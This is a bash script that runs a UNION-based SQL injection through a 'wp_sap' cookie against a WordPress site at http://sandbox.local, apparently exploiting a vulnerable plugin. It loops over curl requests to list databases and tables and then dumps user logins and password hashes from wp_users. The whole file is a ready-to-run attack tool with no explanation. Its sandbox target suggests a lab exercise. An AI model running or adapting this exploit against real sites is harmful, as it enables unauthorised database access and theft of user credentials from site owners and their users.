#!/bin/bash
start="\\\" startresults \\\""
stop="\\\" stopresults \\\""
#query="@@version"
#cookie="wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,concat("$start","$query","$stop"),11#\"]"

#Dumping databases
query="schema_name"
echo "[+] DUMPING DATABASES"
for i in $(seq 1 5);do
	endquery="from information_schema.schemata limit $i,1"
	cookie="wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,concat("$start","$query","$stop"),11 "$endquery"#\"]"
	curl -s http://sandbox.local --cookie "$cookie" | awk -F " startresults " '{print $2}' | awk -F " stopresults " 'NF > 1 {print "	[*] Database --> " $1}'
done

#Dumping tables from wordpress
query="table_name"
echo "[+] DUMPING TABLES FROM WORDPRESS DATABASE"
for i in $(seq 1 15);do
	endquery="from information_schema.tables where table_schema='wordpress' limit $i,1"
	cookie="wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,concat("$start","$query","$stop"),11 "$endquery"#\"]"
	curl -s http://sandbox.local --cookie "$cookie" | awk -F " startresults " '{print $2}' | awk -F " stopresults " 'NF > 1 {print "	[*] Table --> " $1}'
done

#Dumping users
query="user_login"
echo "[+] DUMPING USERS FROM WORDPRESS DATABASE"
for i in $(seq 1 15);do
	endquery="from wordpress.wp_users limit $i,1"
	cookie="wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,concat("$start","$query","$stop"),11 "$endquery"#\"]"
	curl -s http://sandbox.local --cookie "$cookie" | awk -F " startresults " '{print $2}' | awk -F " stopresults " 'NF > 1 {print "	[*] User --> " $1}'
done

#Dumping passwords
query="user_pass"
echo "[+] DUMPING USERS FROM WORDPRESS DATABASE"
for i in $(seq 1 15);do
	endquery="from wordpress.wp_users limit $i,1"
	cookie="wp_sap=[\"1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,concat("$start","$query","$stop"),11 "$endquery"#\"]"
	curl -s http://sandbox.local --cookie "$cookie" | awk -F " startresults " '{print $2}' | awk -F " stopresults " 'NF > 1 {print "	[*] Pass --> " $1}'
done
